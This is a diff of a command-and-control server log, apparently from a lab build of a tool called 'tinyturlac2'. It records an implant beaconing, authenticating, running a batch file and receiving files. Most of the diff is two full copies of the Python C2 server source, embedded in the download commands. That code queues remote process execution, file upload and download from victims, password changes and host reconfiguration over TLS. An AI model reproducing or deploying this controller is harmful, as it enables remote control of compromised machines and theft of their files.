@@ -1,150 +1,162 @@
-192.168.56.1 - - [18/Jan/2025 19:08:38] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:08:43] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:08:48] "GET / HTTP/1.1" 200 -
-Command added: Set TimeLong ['5000']
-192.168.56.1 - - [18/Jan/2025 19:08:53] "GET / HTTP/1.1" 200 -
-GET -> Title: 17
-GET -> Body raw: b'\x00p\x00a\x00s\x00s\x00n\x00e\x00w\x00\x00\x00'
-GET -> Body: {'Command': 'Authentication', 'Decoded String': 'passnew'}
-POST -> 76c19992-0811-4d99-9b6b-41ce0e9e6cc6 is now authenticated.
-192.168.56.1 - - [18/Jan/2025 19:08:53] "POST / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:08:54] "GET / HTTP/1.1" 200 -
-GET -> Title: 11
-GET -> Body raw: b'\x085\x000\x000\x000\x00\x00\x00'
-GET -> Body: {'Command': 'Set TimeLong', 'Decoded String': '5000'}
-POST -> Set TimeLong from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. raw_data=b'\x08\x00'
-192.168.56.1 - - [18/Jan/2025 19:08:54] "POST / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:08:54] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:08:59] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:09:04] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:09:09] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:09:14] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:09:19] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:09:24] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:09:29] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:09:34] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:09:39] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:09:44] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:09:49] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:09:54] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:11:00] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:12:33] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:12:38] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:12:43] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:12:48] "GET / HTTP/1.1" 200 -
-Command added: Set TimeLong ['5000']
-192.168.56.1 - - [18/Jan/2025 19:12:53] "GET / HTTP/1.1" 200 -
-GET -> Title: 17
-GET -> Body raw: b'\x00p\x00a\x00s\x00s\x00n\x00e\x00w\x00\x00\x00'
-GET -> Body: {'Command': 'Authentication', 'Decoded String': 'passnew'}
-POST -> 76c19992-0811-4d99-9b6b-41ce0e9e6cc6 is now authenticated.
-192.168.56.1 - - [18/Jan/2025 19:12:53] "POST / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:12:53] "GET / HTTP/1.1" 200 -
-GET -> Title: 11
-GET -> Body raw: b'\x085\x000\x000\x000\x00\x00\x00'
-GET -> Body: {'Command': 'Set TimeLong', 'Decoded String': '5000'}
-POST -> Set TimeLong from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. raw_data=b'\x08\x00'
-192.168.56.1 - - [18/Jan/2025 19:12:53] "POST / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:12:54] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:12:59] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:13:04] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:13:09] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:13:14] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:13:19] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:13:24] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:13:29] "GET / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:20] "GET / HTTP/1.1" 200 -
 Command added: Execute w/ output ['C:\\Users\\USER\\Desktop\\script.bat']
-192.168.56.1 - - [18/Jan/2025 19:13:34] "GET / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:25] "GET / HTTP/1.1" 200 -
+GET -> Title: 23
+GET -> Body raw: b'\x00p\x00a\x00s\x00s\x00n\x00e\x00w\x00w\x00w\x00w\x00\x00\x00'
+GET -> Body: {'Command': 'Authentication', 'Decoded String': 'passnewwww'}
+POST -> 76c19992-0811-4d99-9b6b-41ce0e9e6cc6 is now authenticated.
+192.168.56.1 - - [18/Jan/2025 20:11:25] "POST / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:25] "GET / HTTP/1.1" 200 -
 GET -> Title: 67
 GET -> Body raw: b'\x02C\x00:\x00\\\x00U\x00s\x00e\x00r\x00s\x00\\\x00U\x00S\x00E\x00R\x00\\\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\\\x00s\x00c\x00r\x00i\x00p\x00t\x00.\x00b\x00a\x00t\x00\x00\x00'
 GET -> Body: {'Command': 'Execute w/ output', 'Decoded String': 'C:\\Users\\USER\\Desktop\\script.bat'}
-POST -> 0x02 error from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. Re-send the last command.
-Re-queued last command: [2, 'C:\\Users\\USER\\Desktop\\script.bat']
-192.168.56.1 - - [18/Jan/2025 19:13:34] "POST / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:13:35] "GET / HTTP/1.1" 200 -
-GET -> Title: 17
-GET -> Body raw: b'\x00p\x00a\x00s\x00s\x00n\x00e\x00w\x00\x00\x00'
-GET -> Body: {'Command': 'Authentication', 'Decoded String': 'passnew'}
-POST -> 76c19992-0811-4d99-9b6b-41ce0e9e6cc6 is now authenticated.
-192.168.56.1 - - [18/Jan/2025 19:13:35] "POST / HTTP/1.1" 200 -
+POST -> Execute w/ output from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. raw_data=b'\x02\x00\r\nC:\\Windows\\system32>echo xd \r\nxd\r\n'
+192.168.56.1 - - [18/Jan/2025 20:11:25] "POST / HTTP/1.1" 200 -
 Command added: Download file ['C:\\code\\tinyturlac2\\c2.py', 'C:\\Users\\USER\\Desktop\\c22.py']
-192.168.56.1 - - [18/Jan/2025 19:13:35] "GET / HTTP/1.1" 200 -
-GET -> Title: 67
-GET -> Body raw: b'\x02C\x00:\x00\\\x00U\x00s\x00e\x00r\x00s\x00\\\x00U\x00S\x00E\x00R\x00\\\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\\\x00s\x00c\x00r\x00i\x00p\x00t\x00.\x00b\x00a\x00t\x00\x00\x00'
-GET -> Body: {'Command': 'Execute w/ output', 'Decoded String': 'C:\\Users\\USER\\Desktop\\script.bat'}
-Command added: Upload file ['C:\\code\\tinyturlac2\\c22.py', 'C:\\Users\\USER\\Desktop\\c22.py']
-Command added: Set TimeShort ['200']
-Command added: Set new Security password ['passnew']
 Queued Download: C:\code\tinyturlac2\c2.py -> C:\Users\USER\Desktop\c22.py
-192.168.56.1 - - [18/Jan/2025 19:14:12] "GET / HTTP/1.1" 200 -
-GET -> Title: 10968
-GET -> Body raw: b'\x03C\x00:\x00\\\x00U\x00s\x00e\x00r\x00s\x00\\\x00U\x00S\x00E\x00R\x00\\\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\\\x00c\x002\x002\x00.\x00p\x00y\x00\x00\x00import os\r\nimport ssl\r\nimport threading\r\nimport queue\r\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\r\n\r\nSECURITY_PASSWORD_FILE = "security_password.txt"\r\nHOST_CONFIG_FILE = "host_config.txt"\r\n\r\ndef load_security_password():\r\n    if os.path.exists(SECURITY_PASSWORD_FILE):\r\n        with open(SECURITY_PASSWORD_FILE, "r", encoding="utf-8") as f:\r\n            return f.read().strip()\r\n    pw = "test"\r\n    with open(SECURITY_PASSWORD_FILE, "w", encoding="utf-8") as f:\r\n        f.write(pw)\r\n    return pw\r\n\r\ndef store_security_password(new_password):\r\n    with open(SECURITY_PASSWORD_FILE, "w", encoding="utf-8") as f:\r\n        f.write(new_password)\r\n\r\ndef load_host_config():\r\n    if os.path.exists(HOST_CONFIG_FILE):\r\n        with open(HOST_CONFIG_FILE, "r", encoding="utf-8") as f:\r\n            return f.read().strip()\r\n    return ""\r\n\r\ndef store_host_config(ip_port_str):\r\n    with open(HOST_CONFIG_FILE, "w", encoding="utf-8") as f:\r\n        f.write(ip_port_str)\r\n\r\nSECURITY_PASSWORD = load_security_password()\r\ncommand_queue = queue.Queue()\r\nconnected_guids = {}\r\nfileFrom = {}\r\npending_passwords = {}\r\npending_hosts = {}\r\nlast_command = {}\r\n\r\nCOMMANDS = {\r\n    0x00: "Authentication", 0x01: "Execute process", 0x02: "Execute w/ output", 0x03: "Download file",\r\n    0x04: "Upload file",    0x05: "Create Subprocess",0x06: "Close Subprocess",0x07: "Subprocess pipe in/out",\r\n    0x08: "Set TimeLong",   0x09: "Set TimeShort",    0x0A: "Set new Security password", 0x0B: "Set Host(s)"\r\n}\r\n\r\ndef log_to_file(message, filename="c2_server.log"):\r\n    with open(filename, "a", encoding="utf-8") as lf:\r\n        lf.write(f"{message}\\n")\r\n\r\ndef decode_file_command(payload: bytes):\r\n    path_bytes = bytearray()\r\n    i = 0\r\n    while i + 1 < len(payload):\r\n        if payload[i] == 0x00 and payload[i+1] == 0x00:\r\n            i += 2\r\n            break\r\n        path_bytes.extend(payload[i:i+2])\r\n        i += 2\r\n    return path_bytes.decode("utf-16-le", errors="ignore"), payload[i:]\r\n\r\ndef decode_body(response_body):\r\n    try:\r\n        cmd = response_body[0]\r\n        cmd_desc = COMMANDS.get(cmd, "Unknown Command")\r\n        payload = response_body[1:]\r\n        if cmd in [0x03, 0x04]:\r\n            client_path, file_data = decode_file_command(payload)\r\n            return {\r\n                "Command": cmd_desc,\r\n                "Client Path": client_path,\r\n                "Binary Data Length": len(file_data),\r\n                "Binary Data Preview": file_data[:20],\r\n            }\r\n        return {"Command": cmd_desc, "Decoded String": payload.decode("utf-16-le", errors="ignore").rstrip("\\x00")}\r\n    except Exception as e:\r\n        return {"Error": str(e)}\r\n\r\nclass C2Handler(BaseHTTPRequestHandler):\r\n    def log_message(self, format, *args):\r\n        log_to_file(f"{self.address_string()} - - [{self.log_date_time_string()}] {format % args}")\r\n\r\n    def send_ok(self):\r\n        self.send_response(200)\r\n        self.end_headers()\r\n\r\n    def send_get_response(self, body):\r\n        cmd_len = len(body)\r\n        self.send_response(200)\r\n        self.send_header("Title", cmd_len)\r\n        self.end_headers()\r\n        log_to_file(f"GET -> Title: {cmd_len}")\r\n        log_to_file(f"GET -> Body raw: {body}")\r\n        log_to_file(f"GET -> Body: {decode_body(body)}")\r\n        self.wfile.write(body)\r\n\r\n    def do_GET(self):\r\n        guid = self.headers.get("Title") or "UnknownGUID"\r\n        if guid not in connected_guids:\r\n            connected_guids[guid] = False\r\n        if command_queue.empty():\r\n            self.send_ok()\r\n            return\r\n        if not connected_guids[guid]:\r\n            auth_cmd = 0x00\r\n            payload = SECURITY_PASSWORD.encode("utf-16-le") + b"\\x00\\x00"\r\n            self.send_get_response(bytes([auth_cmd]) + payload)\r\n            return\r\n        item = command_queue.get()\r\n        command_byte = item[0]\r\n        args = item[1:]\r\n        last_command[guid] = item\r\n        response_body = b""\r\n\r\n        if command_byte == 0x03:  # Download file\r\n            file_path, client_path = args\r\n            try:\r\n                with open(file_path, "rb") as f:\r\n                    file_data = f.read()\r\n                path_utf16 = client_path.encode("utf-16-le") + b"\\x00\\x00"\r\n                response_body = bytes([command_byte]) + path_utf16 + file_data\r\n                log_to_file(f"Queued Download: {file_path} -> {client_path}")\r\n            except Exception as e:\r\n                log_to_file(f"Download file error: {e}")\r\n        elif command_byte == 0x04:  # Upload file\r\n            file_path, client_path = args\r\n            fileFrom[guid] = file_path\r\n            path_utf16 = client_path.encode("utf-16-le") + b"\\x00\\x00"\r\n            response_body = bytes([command_byte]) + path_utf16\r\n        elif command_byte == 0x0A:  # Set new Security password\r\n            new_password = " ".join(args)\r\n            pending_passwords[guid] = new_password\r\n            payload_utf16 = new_password.encode("utf-16-le") + b"\\x00\\x00"\r\n            response_body = bytes([command_byte]) + payload_utf16\r\n            log_to_file(f"Set new Security password queued for {guid}: {new_password}")\r\n        elif command_byte == 0x0B:  # Set host config\r\n            ip, port = args\r\n            pending_hosts[guid] = f"{ip} {port}"\r\n            payload_utf16 = (f"{ip} {port}").encode("utf-16-le") + b"\\x00\\x00"\r\n            response_body = bytes([command_byte]) + payload_utf16\r\n            log_to_file(f"Set Host(s) queued for {guid}: {ip} {port}")\r\n        else:  # Other commands\r\n            combined_args = " ".join(args)\r\n            payload_utf16 = combined_args.encode("utf-16-le") + b"\\x00\\x00"\r\n            response_body = bytes([command_byte]) + payload_utf16\r\n\r\n        self.send_get_response(response_body)\r\n\r\n    def do_POST(self):\r\n        guid = self.headers.get("Title", "NoGuid")\r\n        if guid not in connected_guids:\r\n            connected_guids[guid] = False\r\n        content_length = int(self.headers.get(\'Content-Length\', 0))\r\n        raw_data = self.rfile.read(content_length)\r\n        if not raw_data:\r\n            self.send_ok()\r\n            return\r\n        cmd = raw_data[0]\r\n        error_code = raw_data[1] if len(raw_data) > 1 else None\r\n\r\n        if error_code == 0x02:\r\n            log_to_file(f"POST -> 0x02 error from {guid}. Re-send the last command.")\r\n            if guid in last_command:\r\n                command_queue.put(last_command[guid])\r\n                connected_guids[guid] = False\r\n                log_to_file(f"Re-queued last command: {last_command[guid]}")\r\n            else:\r\n                log_to_file(f"No last command stored for {guid}.")\r\n        elif cmd == 0x00:\r\n            if len(raw_data) > 1 and raw_data[1] == 0x00:\r\n                connected_guids[guid] = True\r\n                log_to_file(f"POST -> {guid} is now authenticated.")\r\n            else:\r\n                connected_guids[guid] = False\r\n                log_to_file(f"POST -> Auth error from {guid}. raw_data={raw_data}")\r\n        elif cmd == 0x02:\r\n            print(f"POST -> {COMMANDS.get(cmd, \'Unknown\')} from {guid}. raw_data={raw_data}")\r\n            log_to_file(f"POST -> {COMMANDS.get(cmd, \'Unknown\')} from {guid}. raw_data={raw_data}")\r\n        elif cmd == 0x04:\r\n            if fileFrom.get(guid) != "DONE":\r\n                filename = fileFrom.get(guid)\r\n                if filename:\r\n                    with open(filename, "wb") as f:\r\n                        f.write(raw_data[2:])\r\n                    log_to_file(f"POST -> Received file chunk from {guid} into {filename}")\r\n                    fileFrom[guid] = "DONE"\r\n                else:\r\n                    log_to_file(f"POST -> No filename for {guid}. raw={raw_data}")\r\n            else:\r\n                log_to_file(f"POST -> Already saved file from {guid}: {raw_data}")\r\n        elif cmd == 0x0A:\r\n            if len(raw_data) > 1 and raw_data[1] == 0x00:\r\n                new_pass = pending_passwords.get(guid)\r\n                if new_pass:\r\n                    store_security_password(new_pass)\r\n                    log_to_file(f"POST -> Password changed for {guid}. Now \'{new_pass}\' stored.")\r\n                    del pending_passwords[guid]\r\n                else:\r\n                    log_to_file(f"POST -> 0x0A ack from {guid}, but no pending password found.")\r\n            else:\r\n                log_to_file(f"POST -> 0x0A from {guid}, second byte != 0x00. Raw={raw_data}")\r\n        elif cmd == 0x0B:\r\n            if len(raw_data) > 1 and raw_data[1] == 0x00:\r\n                new_host = pending_hosts.get(guid)\r\n                if new_host:\r\n                    store_host_config(new_host)\r\n                    log_to_file(f"POST -> Host config changed for {guid}. Now \'{new_host}\' stored.")\r\n                    del pending_hosts[guid]\r\n                else:\r\n                    log_to_file(f"POST -> 0x0B ack from {guid}, but no pending host found.")\r\n            else:\r\n                log_to_file(f"POST -> 0x0B from {guid}, second byte != 0x00. Raw={raw_data}")\r\n        else:\r\n            log_to_file(f"POST -> {COMMANDS.get(cmd, \'Unknown\')} from {guid}. raw_data={raw_data}")\r\n\r\n        self.send_ok()\r\n\r\ndef read_commands():\r\n    while True:\r\n        user_input = input("Enter command (e.g. \'b 192.168.56.1 9500\'): ").strip()\r\n        if user_input:\r\n            parts = user_input.split()\r\n            try:\r\n                if parts[0].lower() == \'b\':\r\n                    cmd = 0x0B\r\n                    args = parts[1:]\r\n                else:\r\n                    cmd = int(parts[0], 16)\r\n                    args = parts[1:]\r\n            except ValueError:\r\n                print("Invalid format. e.g. \'b 192.168.56.1 9500\' or \'9 2000\'")\r\n                continue\r\n            command_queue.put([cmd] + args)\r\n            log_to_file(f"Command added: {COMMANDS.get(cmd, \'Unknown\')} {args}")\r\n\r\ndef start_c2_server(server_started_event):\r\n    host_config = load_host_config()\r\n    if host_config:\r\n        ip_str, port_str = host_config.split()\r\n        server_ip, server_port = ip_str, int(port_str)\r\n    else:\r\n        server_ip, server_port = \'0.0.0.0\', 9500\r\n    httpd = HTTPServer((server_ip, server_port), C2Handler)\r\n    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\r\n    context.load_cert_chain(certfile="server.crt", keyfile="server.key")\r\n    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)\r\n    print(f"Server started {server_ip}:{server_port}")\r\n    server_started_event.set()  # Notify that the server has started\r\n    httpd.serve_forever()\r\n\r\nif __name__ == "__main__":\r\n    server_started_event = threading.Event()\r\n    threading.Thread(target=start_c2_server, args=(server_started_event,), daemon=True).start()\r\n\r\n    # Wait for the server to start before reading commands\r\n    server_started_event.wait()\r\n    print("C2 server is running. Ready to accept commands.")\r\n    read_commands()\r\n\r\n'
-GET -> Body: {'Command': 'Download file', 'Client Path': 'C:\\Users\\USER\\Desktop\\c22.py', 'Binary Data Length': 10909, 'Binary Data Preview': b'import os\r\nimport ss'}
+192.168.56.1 - - [18/Jan/2025 20:11:26] "GET / HTTP/1.1" 200 -
+GET -> Title: 11464
+GET -> Body raw: b'\x03C\x00:\x00\\\x00U\x00s\x00e\x00r\x00s\x00\\\x00U\x00S\x00E\x00R\x00\\\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\\\x00c\x002\x002\x00.\x00p\x00y\x00\x00\x00import os\r\nimport ssl\r\nimport threading\r\nimport queue\r\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\r\n\r\nSECURITY_PASSWORD_FILE = "security_password.txt"\r\nHOST_CONFIG_FILE = "host_config.txt"\r\n\r\ndef load_security_password():\r\n    global SECURITY_PASSWORD_GLOBAL\r\n    if SECURITY_PASSWORD_GLOBAL is not None:\r\n        return SECURITY_PASSWORD_GLOBAL \r\n\r\n    if os.path.exists(SECURITY_PASSWORD_FILE):\r\n        with open(SECURITY_PASSWORD_FILE, "r", encoding="utf-8") as f:\r\n            SECURITY_PASSWORD_GLOBAL = f.read().strip()\r\n    else:\r\n        SECURITY_PASSWORD_GLOBAL = "test"  # Default password\r\n        with open(SECURITY_PASSWORD_FILE, "w", encoding="utf-8") as f:\r\n            f.write(SECURITY_PASSWORD_GLOBAL)\r\n    \r\n    return SECURITY_PASSWORD_GLOBAL\r\n\r\ndef store_security_password(new_password):\r\n    global SECURITY_PASSWORD_GLOBAL\r\n    SECURITY_PASSWORD_GLOBAL = new_password  # Update the global variable\r\n    with open(SECURITY_PASSWORD_FILE, "w", encoding="utf-8") as f:\r\n        f.write(new_password)\r\n\r\ndef load_host_config():\r\n    if os.path.exists(HOST_CONFIG_FILE):\r\n        with open(HOST_CONFIG_FILE, "r", encoding="utf-8") as f:\r\n            return f.read().strip()\r\n    return ""\r\n\r\ndef store_host_config(ip_port_str):\r\n    with open(HOST_CONFIG_FILE, "w", encoding="utf-8") as f:\r\n        f.write(ip_port_str)\r\n\r\nSECURITY_PASSWORD_GLOBAL = None\r\nSECURITY_PASSWORD_GLOBAL = load_security_password()\r\ncommand_queue = queue.Queue()\r\nconnected_guids = {}\r\nfileFrom = {}\r\npending_passwords = {}\r\npending_hosts = {}\r\nlast_command = {}\r\n\r\nCOMMANDS = {\r\n    0x00: "Authentication", 0x01: "Execute process", 0x02: "Execute w/ output", 0x03: "Download file",\r\n    0x04: "Upload file",    0x05: "Create Subprocess",0x06: "Close Subprocess",0x07: "Subprocess pipe in/out",\r\n    0x08: "Set TimeLong",   0x09: "Set TimeShort",    0x0A: "Set new Security password", 0x0B: "Set Host(s)"\r\n} # Fist c2 path then client path: 4 C:\\host_path\\c2.py C:\\client_path\\c2.py\r\n\r\ndef log_to_file(message, filename="c2_server.log"):\r\n    with open(filename, "a", encoding="utf-8") as lf:\r\n        lf.write(f"{message}\\n")\r\n\r\ndef decode_file_command(payload: bytes):\r\n    path_bytes = bytearray()\r\n    i = 0\r\n    while i + 1 < len(payload):\r\n        if payload[i] == 0x00 and payload[i+1] == 0x00:\r\n            i += 2\r\n            break\r\n        path_bytes.extend(payload[i:i+2])\r\n        i += 2\r\n    return path_bytes.decode("utf-16-le", errors="ignore"), payload[i:]\r\n\r\ndef decode_body(response_body):\r\n    try:\r\n        cmd = response_body[0]\r\n        cmd_desc = COMMANDS.get(cmd, "Unknown Command")\r\n        payload = response_body[1:]\r\n        if cmd in [0x03, 0x04]:\r\n            client_path, file_data = decode_file_command(payload)\r\n            return {\r\n                "Command": cmd_desc,\r\n                "Client Path": client_path,\r\n                "Binary Data Length": len(file_data),\r\n                "Binary Data Preview": file_data[:20],\r\n            }\r\n        return {"Command": cmd_desc, "Decoded String": payload.decode("utf-16-le", errors="ignore").rstrip("\\x00")}\r\n    except Exception as e:\r\n        return {"Error": str(e)}\r\n\r\nclass C2Handler(BaseHTTPRequestHandler):\r\n    def log_message(self, format, *args):\r\n        log_to_file(f"{self.address_string()} - - [{self.log_date_time_string()}] {format % args}")\r\n\r\n    def send_ok(self):\r\n        self.send_response(200)\r\n        self.end_headers()\r\n\r\n    def send_get_response(self, body):\r\n        cmd_len = len(body)\r\n        self.send_response(200)\r\n        self.send_header("Title", cmd_len)\r\n        self.end_headers()\r\n        log_to_file(f"GET -> Title: {cmd_len}")\r\n        log_to_file(f"GET -> Body raw: {body}")\r\n        log_to_file(f"GET -> Body: {decode_body(body)}")\r\n        self.wfile.write(body)\r\n\r\n    def do_GET(self):\r\n        guid = self.headers.get("Title") or "UnknownGUID"\r\n        if guid not in connected_guids:\r\n            connected_guids[guid] = False\r\n        if command_queue.empty():\r\n            self.send_ok()\r\n            return\r\n        if not connected_guids[guid]:\r\n            auth_cmd = 0x00\r\n            payload = SECURITY_PASSWORD_GLOBAL.encode("utf-16-le") + b"\\x00\\x00"\r\n            self.send_get_response(bytes([auth_cmd]) + payload)\r\n            return\r\n        item = command_queue.get()\r\n        command_byte = item[0]\r\n        args = item[1:]\r\n        last_command[guid] = item\r\n        response_body = b""\r\n\r\n        if command_byte == 0x03:  # Download file\r\n            file_path, client_path = args\r\n            try:\r\n                with open(file_path, "rb") as f:\r\n                    file_data = f.read()\r\n                path_utf16 = client_path.encode("utf-16-le") + b"\\x00\\x00"\r\n                response_body = bytes([command_byte]) + path_utf16 + file_data\r\n                log_to_file(f"Queued Download: {file_path} -> {client_path}")\r\n            except Exception as e:\r\n                log_to_file(f"Download file error: {e}")\r\n        elif command_byte == 0x04:  # Upload file\r\n            file_path, client_path = args\r\n            fileFrom[guid] = file_path\r\n            path_utf16 = client_path.encode("utf-16-le") + b"\\x00\\x00"\r\n            response_body = bytes([command_byte]) + path_utf16\r\n        elif command_byte == 0x0A:  # Set new Security password\r\n            new_password = " ".join(args)\r\n            pending_passwords[guid] = new_password\r\n            payload_utf16 = new_password.encode("utf-16-le") + b"\\x00\\x00"\r\n            response_body = bytes([command_byte]) + payload_utf16\r\n            log_to_file(f"Set new Security password queued for {guid}: {new_password}")\r\n        elif command_byte == 0x0B:  # Set host config\r\n            ip, port = args\r\n            pending_hosts[guid] = f"{ip} {port}"\r\n            payload_utf16 = (f"{ip} {port}").encode("utf-16-le") + b"\\x00\\x00"\r\n            response_body = bytes([command_byte]) + payload_utf16\r\n            log_to_file(f"Set Host(s) queued for {guid}: {ip} {port}")\r\n        else:  # Other commands\r\n            combined_args = " ".join(args)\r\n            payload_utf16 = combined_args.encode("utf-16-le") + b"\\x00\\x00"\r\n            response_body = bytes([command_byte]) + payload_utf16\r\n\r\n        self.send_get_response(response_body)\r\n\r\n    def do_POST(self):\r\n        guid = self.headers.get("Title", "NoGuid")\r\n        if guid not in connected_guids:\r\n            connected_guids[guid] = False\r\n        content_length = int(self.headers.get(\'Content-Length\', 0))\r\n        raw_data = self.rfile.read(content_length)\r\n        if not raw_data:\r\n            self.send_ok()\r\n            return\r\n        cmd = raw_data[0]\r\n        error_code = raw_data[1] if len(raw_data) > 1 else None\r\n\r\n        if error_code == 0x02:\r\n            log_to_file(f"POST -> 0x02 error from {guid}. Re-send the last command.")\r\n            if guid in last_command:\r\n                command_queue.put(last_command[guid])\r\n                connected_guids[guid] = False\r\n                log_to_file(f"Re-queued last command: {last_command[guid]}")\r\n            else:\r\n                log_to_file(f"No last command stored for {guid}.")\r\n        elif cmd == 0x00:\r\n            if len(raw_data) > 1 and raw_data[1] == 0x00:\r\n                connected_guids[guid] = True\r\n                log_to_file(f"POST -> {guid} is now authenticated.")\r\n            else:\r\n                connected_guids[guid] = False\r\n                log_to_file(f"POST -> Auth error from {guid}. raw_data={raw_data}")\r\n        elif cmd == 0x02:\r\n            print(f"POST -> {COMMANDS.get(cmd, \'Unknown\')} from {guid}. raw_data={raw_data}")\r\n            log_to_file(f"POST -> {COMMANDS.get(cmd, \'Unknown\')} from {guid}. raw_data={raw_data}")\r\n        elif cmd == 0x04:\r\n            if fileFrom.get(guid) != "DONE":\r\n                filename = fileFrom.get(guid)\r\n                if filename:\r\n                    with open(filename, "wb") as f:\r\n                        f.write(raw_data[2:])\r\n                    log_to_file(f"POST -> Received file chunk from {guid} into {filename}")\r\n                    fileFrom[guid] = "DONE"\r\n                else:\r\n                    log_to_file(f"POST -> No filename for {guid}. raw={raw_data}")\r\n            else:\r\n                log_to_file(f"POST -> Already saved file from {guid}: {raw_data}")\r\n        elif cmd == 0x0A:\r\n            if len(raw_data) > 1 and raw_data[1] == 0x00:\r\n                new_pass = pending_passwords.get(guid)\r\n                if new_pass:\r\n                    store_security_password(new_pass)\r\n                    log_to_file(f"POST -> Password changed for {guid}. Now \'{new_pass}\' stored.")\r\n                    del pending_passwords[guid]\r\n                else:\r\n                    log_to_file(f"POST -> 0x0A ack from {guid}, but no pending password found.")\r\n            else:\r\n                log_to_file(f"POST -> 0x0A from {guid}, second byte != 0x00. Raw={raw_data}")\r\n        elif cmd == 0x0B:\r\n            if len(raw_data) > 1 and raw_data[1] == 0x00:\r\n                new_host = pending_hosts.get(guid)\r\n                if new_host:\r\n                    store_host_config(new_host)\r\n                    log_to_file(f"POST -> Host config changed for {guid}. Now \'{new_host}\' stored.")\r\n                    del pending_hosts[guid]\r\n                else:\r\n                    log_to_file(f"POST -> 0x0B ack from {guid}, but no pending host found.")\r\n            else:\r\n                log_to_file(f"POST -> 0x0B from {guid}, second byte != 0x00. Raw={raw_data}")\r\n        else:\r\n            log_to_file(f"POST -> {COMMANDS.get(cmd, \'Unknown\')} from {guid}. raw_data={raw_data}")\r\n\r\n        self.send_ok()\r\n\r\ndef read_commands():\r\n    while True:\r\n        user_input = input("Enter command (e.g. \'b 192.168.56.1 9500\'): ").strip()\r\n        if user_input:\r\n            parts = user_input.split()\r\n            try:\r\n                if parts[0].lower() == \'b\':\r\n                    cmd = 0x0B\r\n                    args = parts[1:]\r\n                else:\r\n                    cmd = int(parts[0], 16)\r\n                    args = parts[1:]\r\n            except ValueError:\r\n                print("Invalid format. e.g. \'b 192.168.56.1 9500\' or \'9 2000\'")\r\n                continue\r\n            command_queue.put([cmd] + args)\r\n            log_to_file(f"Command added: {COMMANDS.get(cmd, \'Unknown\')} {args}")\r\n\r\ndef start_c2_server(server_started_event):\r\n    host_config = load_host_config()\r\n    if host_config:\r\n        ip_str, port_str = host_config.split()\r\n        server_ip, server_port = ip_str, int(port_str)\r\n    else:\r\n        server_ip, server_port = \'0.0.0.0\', 9500\r\n    httpd = HTTPServer((server_ip, server_port), C2Handler)\r\n    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\r\n    context.load_cert_chain(certfile="server.crt", keyfile="server.key")\r\n    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)\r\n    print(f"Server started {server_ip}:{server_port}")\r\n    server_started_event.set()  # Notify that the server has started\r\n    httpd.serve_forever()\r\n\r\nif __name__ == "__main__":\r\n    server_started_event = threading.Event()\r\n    threading.Thread(target=start_c2_server, args=(server_started_event,), daemon=True).start()\r\n\r\n    # Wait for the server to start before reading commands\r\n    server_started_event.wait()\r\n    print("C2 server is running. Ready to accept commands.")\r\n    read_commands()\r\n\r\n'
+GET -> Body: {'Command': 'Download file', 'Client Path': 'C:\\Users\\USER\\Desktop\\c22.py', 'Binary Data Length': 11405, 'Binary Data Preview': b'import os\r\nimport ss'}
+POST -> Download file from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. raw_data=b'\x03\x00'
+192.168.56.1 - - [18/Jan/2025 20:11:26] "POST / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:26] "GET / HTTP/1.1" 200 -
